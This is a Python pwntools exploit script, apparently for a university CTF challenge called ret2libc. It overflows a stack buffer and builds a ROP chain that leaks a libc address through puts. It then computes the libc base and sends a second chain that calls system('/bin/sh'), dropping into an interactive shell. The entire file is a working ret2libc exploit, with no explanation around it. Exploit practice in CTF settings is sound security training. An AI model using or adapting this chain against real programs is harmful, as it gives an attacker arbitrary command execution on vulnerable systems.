from pwn import *

context.arch = 'amd64'

l = ELF( '/lib/x86_64-linux-gnu/libc-2.27.so' )
re = process('./ret2libc/ret2libc')
#re = remote( 'edu-ctf.csie.org', 10175 )
pause()
bss = 0x6b6000
pop_rdi = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
ret = 0x400506

gets_plt = 0x400530
puts_plt = 0x400520

libc_start_main_got = 0x600ff0
main = 0x400698


p = flat(
    b'a' * 0x38,
    pop_rdi,
    libc_start_main_got,
    puts_plt,
    main
 )
#puts_plt leak main_got_address
#go to main and bof again
re.sendlineafter( ':D', p)


re.recvline()
# eat \n
libc = u64( re.recv(6) +  b'\0\0' ) - 0x21ab0 #readelf -s /lib/x86_64-linux-gnu/libc-2.27.so |grep 'libc_start'

success( 'libc -> %s' %hex( libc ) )

system_offset = 0x4f440
system_func_ptr = libc + system_offset
bin_sh = libc + 0x1b3e9a

#print ('bin_sh str :' , hex( l.search( b'/bin/sh' ).__next__() ) ) 

'''
p = flat(
    b'a' * 0x38,
    ret,
    pop_rdi,
    bin_sh,
    system_func_ptr
    )
# one more ret for align 0x10
'''
l.address  = libc
p = flat(
    b'a' * 0x38,
    ret,
    pop_rdi,
    l.search( b'/bin/sh' ).__next__(),
    l.sym.system
    )

re.sendlineafter( ':D', p)
re.interactive()
